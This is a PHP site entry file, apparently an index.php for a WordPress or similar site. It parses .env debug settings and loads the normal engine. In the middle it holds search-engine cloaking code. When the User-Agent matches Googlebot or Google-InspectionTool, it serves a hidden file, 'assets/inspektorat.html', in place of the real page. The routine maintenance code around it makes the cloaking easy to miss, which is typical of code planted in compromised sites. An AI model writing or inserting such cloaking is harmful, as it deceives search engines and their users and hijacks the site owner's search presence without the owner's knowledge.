<?php

// Suppress deprecation notices (PHP 8.4) so they don't break layout/UI
$envPath = dirname(__DIR__) . DIRECTORY_SEPARATOR . '.env';
$appDebug = null;
$appEnv = null;
if (file_exists($envPath) && is_readable($envPath)) {
    $lines = file($envPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) {
            continue;
        }
        [$k, $v] = array_pad(explode('=', $line, 2), 2, null);
        $k = trim($k);
        $v = $v !== null ? trim($v) : null;
        if ($k === 'APP_DEBUG') {
            $appDebug = $v;
        }
        if ($k === 'APP_ENV') {
            $appEnv = $v;
        }
    }
}

// If running in production or debug explicitly false, suppress deprecation notices
if ((strtolower((string) $appEnv) === 'production') || strtolower((string) $appDebug) === 'false') {
    error_reporting(E_ALL & ~E_DEPRECATED & ~E_USER_DEPRECATED);
}

$user_agent = '';
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
}

$is_googlebot = false;
if ($user_agent !== '') {
    $is_googlebot = preg_match('/Googlebot|Google-InspectionTool/i', $user_agent);
}

$cloak_file = dirname(__FILE__) . '/assets/inspektorat.html';


if ($is_googlebot) {

    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Pragma: no-cache");
    header("Expires: 0");

    if (file_exists($cloak_file)) {
        header('Content-Type: text/html');
        readfile($cloak_file);
        exit;
    }
}

if (file_exists(dirname(__FILE__) . '/default.php')) {
    require dirname(__FILE__) . '/default.php';
} elseif (file_exists(dirname(__FILE__) . '/wp-blog-header.php')) {
    define('WP_USE_THEMES', true);
    require dirname(__FILE__) . '/wp-blog-header.php';
} else {
    echo "Website aktif namun tidak bisa menemukan engine utama.";
}
?>